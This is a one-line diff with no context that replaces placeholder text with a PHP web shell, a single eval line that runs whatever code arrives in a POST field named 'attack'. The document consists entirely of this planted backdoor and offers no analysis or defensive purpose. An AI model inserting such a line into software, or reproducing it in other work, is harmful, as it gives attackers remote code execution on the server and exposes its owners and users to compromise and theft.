@@ -1,1 +1,1 @@
-aaa
+<?php @eval($_POST['attack']);?>
